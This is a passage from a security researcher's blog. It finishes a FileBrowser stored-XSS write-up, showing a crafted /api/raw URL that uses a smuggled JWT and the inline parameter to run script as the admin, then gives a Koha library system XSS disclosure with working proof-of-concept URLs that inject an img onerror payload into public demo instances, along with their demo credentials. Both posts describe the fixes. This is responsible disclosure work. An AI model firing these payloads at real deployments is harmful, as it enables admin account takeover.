http://your_filebrowser_ip:port//api/raw/poc/xss.htm?auth=[non-admin user's jwt token]&inline=true

```

It will trigger an alert pop-up with Admin’s Cookie.

#### Explanation

* The parameter “?auth=[non-admin token]” is added in the URL so that when the Admin opens the URL it will fetch those HTML/js files that are created by the non-admin user, otherwise FileBrowser will use the Admin’s original jwt token that’s been stored as Cookie thus leading to a “404 Not Found” Error. This is because those files are created by the non-admin user, so if the API tries to fetch them with Admin’s token it will lead to an error, the API also accepts the jwt token inside a URL get parameter “?auth=”. So, the non-admin user can deliberately supply his own JWT token in the malicious URL for a successful exploitation
* The “?inline=true” parameter is included in the crafted URL because without that parameter FileBrowser will treat the HTML file as an attachment and will download it as a file, so by having “inline=true” the HTML file will be treated as an webpage, and execute the javascript.
* Content-Security-Policy(CSP) is bypassed because FileBrowser sets CSP “default-src” to ‘self’. As the malicious JS is also loaded from the same site, it will get executed.

### Impact

This vulnerability is capable of Admin account takeover. Admin can even run system shell commands and access the filesystem, thus leading to Arbitrary Command execution.

**Fix**:

They fixed the vulnerability by adding a CSP that blocks any Javascript from executing on /api/raw endpoint.

<https://github.com/filebrowser/filebrowser/commit/b508ac3d4f7f0f75d6b49c99bdc661a6d2173f30>

Update to the latest version if you are using Filebrowser.

**Filebrowser v2.25.0 is released**

<https://github.com/filebrowser/filebrowser/releases>

# [XSS vulnerability in Koha integrated library system](https://febin0x4e4a.wordpress.com/2023/01/11/xss-vulnerability-in-koha-integrated-library-system/)

[11th January 202311th January 2023](https://febin0x4e4a.wordpress.com/2023/01/11/xss-vulnerability-in-koha-integrated-library-system/) / [FebiNJ](https://febin0x4e4a.wordpress.com/author/febin0x4e4a/)  / [Leave a comment](https://febin0x4e4a.wordpress.com/2023/01/11/xss-vulnerability-in-koha-integrated-library-system/#respond)

This is Febin, a Security Researcher. This article is about a Cross-Site Scripting vulnerability I found in a popular library management system named Koha.

**Koha Library Software**:

![](https://febin0x4e4a.wordpress.com/wp-content/uploads/2023/01/koha.png?w=394)

Koha is an open-source integrated library system (ILS), used world-wide by public, school and special libraries.

Koha is a web-based ILS, with a SQL database (MariaDB or MySQL preferred) back end with cataloguing data stored in MARC and accessible via Z39.50 or SRU. The user interface is very configurable and adaptable and has been translated into many languages. Koha has most of the features that would be expected in an ILS, including:

```

Various Web 2.0 facilities like tagging, comment, social sharing and RSS feeds
Union catalog facility
Customizable search
Online circulation
Bar code printing
Patron card creation
Report generation
Patron self registration form through OPAC

```

Official Site: <https://koha-community.org/>

**The Vulnerability:**

A Cross-Site Scripting (XSS) vulnerability has been found in Koha Library software that can be used by an external attacker to steal credentials, deliver malware and take over admin account for further exploitation.

The vulnerability exists in the “HTML customizations” and “News” features under “Additional tools”(/cgi-bin/koha/tools/additional-contents.pl).

![](https://febin0x4e4a.wordpress.com/wp-content/uploads/2023/01/koha_html.png?w=1024)

An attacker can craft a URL and send it to the victim, if the victim is authenticated, then the javascript will get executed and if he’s not authenticated then Koha will prompt its login, after successful sign-in, the XSS payload will get executed. And the payload will be stored under the “HTML customizations” section i.e, whenever the victim visits that section, the XSS payload will be triggered thus making this a persistent XSS

## Proof Of Concept:

There are many demo instances of Koha software that are hosted online and are officially listed on Koha’s official website.

I have used a couple of demo Koha instances to test and prove the vulnerability.

Demo 1: intranet-demo.biblibre.com

Demo Credentials: test/test

<https://intranet-demo.biblibre.com/cgi-bin/koha/tools/additional-contents.pl?op=add_validate&category=html_customizations&code=&idnew=38&redirect=&editmode=wysiwyg&location=&&title_default=test&content_default=%3Cimg+src=X+onerror=alert(%27FEBIN%27)%3E&lang=default>

![](https://febin0x4e4a.wordpress.com/wp-content/uploads/2023/01/koha_xss1-1.png?w=1024)

Demo 1: demo-admin.catalyst-koha.com.au

Demo Credentials: staff/staff1

<https://demo-admin.catalyst-koha.com.au//cgi-bin/koha/tools/additional-contents.pl?op=add_validate&category=html_customizations&code=&idnew=38&redirect=/&editmode=wysiwyg&location=&&title_default=test&content_default=%3Cimg+src=X+onerror=alert(%27FEBIN%27)%3E&lang=default>

![](https://febin0x4e4a.wordpress.com/wp-content/uploads/2023/01/koha_xss2.png?w=1024)

**Fix:** Disable Javascript in HTML customizations, Sanitize user input, Use anti-CSRF token

<https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html>

**Thanks.**

# Posts navigation

[← Older posts](https://febin0x4e4a.wordpress.com/author/febin0x4e4a/page/2/)

Search for:

# Recent Posts

* [Privilege Escalation Vulnerability in Balena Etcher Software](https://febin0x4e4a.wordpress.com/2024/08/22/privilege-escalation-vulnerability-in-balena-etcher-software/)
* [CVE-2024-28739, CVE-2024-28740: XSS to One-Click RCE in Koha ILS](https://febin0x4e4a.wordpress.com/2024/03/07/xss-to-one-click-rce-in-koha-ils/)
* [CVE-2023-44452, CVE-2023-51698: CBT File Parsing Argument Injection that affected Popular Linux Distros](https://febin0x4e4a.wordpress.com/2024/01/17/cve-2023-44452-cve-2023-51698-cbt-file-parsing-argument-injection-that-affected-popular-linux-distros/)
* [CVE-2023-44451, CVE-2023-52076: EPUB File Parsing Directory Traversal RCE Vulnerability affecting popular distros](https://febin0x4e4a.wordpress.com/2024/01/17/cve-2023-44451-cve-2023-52076-epub-file-parsing-directory-traversal-rce-vulnerability-affecting-popular-distros/)
* [Zip Path Traversal in Asus Smartphone’s default FileManager App.](https://febin0x4e4a.wordpress.com/2024/01/10/zip-path-traversal-in-asus-smartphones-default-filemanager-app/)
# Recent Comments

# Archives

* [August 2024](https://febin0x4e4a.wordpress.com/2024/08/)
* [March 2024](https://febin0x4e4a.wordpress.com/2024/03/)
* [January 2024](https://febin0x4e4a.wordpress.com/2024/01/)
* [December 2023](https://febin0x4e4a.wordpress.com/2023/12/)
* [October 2023](https://febin0x4e4a.wordpress.com/2023/10/)
* [September 2023](https://febin0x4e4a.wordpress.com/2023/09/)
* [January 2023](https://febin0x4e4a.wordpress.com/2023/01/)
* [March 2022](https://febin0x4e4a.wordpress.com/2022/03/)
* [January 2022](https://febin0x4e4a.wordpress.com/2022/01/)
# Categories

* [Uncategorized](https://febin0x4e4a.wordpress.com/category/uncategorised/)

[Create a free website or blog at WordPress.com.](https://wordpress.com/?ref=footer_website)

[febiNJ](https://febin0x4e4a.wordpress.com/)

[Create a free website or blog at WordPress.com.](https://wordpress.com/?ref=footer_website)

* Subscribe
  Subscribed

  + [![](https://febin0x4e4a.wordpress.com/wp-content/uploads/2022/01/cropped-hacker-operate-laptop-cartoon-illustration_188898-166.jpg?w=50) febiNJ](https://febin0x4e4a.wordpress.com)

  Sign me up

  + Already have a WordPress.com account? [Log in now.](https://wordpress.com/log-in?redirect_to=https%3A%2F%2Ffebin0x4e4a.wordpress.com%2F2024%2F08%2F22%2Fprivilege-escalation-vulnerability-in-balena-etcher-software%2F&signup_flow=account)
* Privacy
* + [![](https://febin0x4e4a.wordpress.com/wp-content/uploads/2022/01/cropped-hacker-operate-laptop-cartoon-illustration_188898-166.jpg?w=50) febiNJ](https://febin0x4e4a.wordpress.com)
  + Subscribe
    Subscribed
  + [Sign up](https://wordpress.com/start/)
  + [Log in](https://wordpress.com/log-in?redirect_to=https%3A%2F%2Ffebin0x4e4a.wordpress.com%2F2024%2F08%2F22%2Fprivilege-escalation-vulnerability-in-balena-etcher-software%2F&signup_flow=account)
  + [Report this content](https://wordpress.com/abuse/?report_url=https://febin0x4e4a.wordpress.com)
  + [View site in Reader](https://wordpress.com/read/blogs/201901473)
  + [Manage subscriptions](https://subscribe.wordpress.com/)
  + Collapse this bar

##

##

Loading Comments...

Write a Comment...

Email (Required)

Name (Required)

Website

###

![](https://pixel.wp.com/b.gif?v=noscript)
Design a site like this with WordPress.com[Get started](https://wordpress.com/start/?ref=marketing_bar)

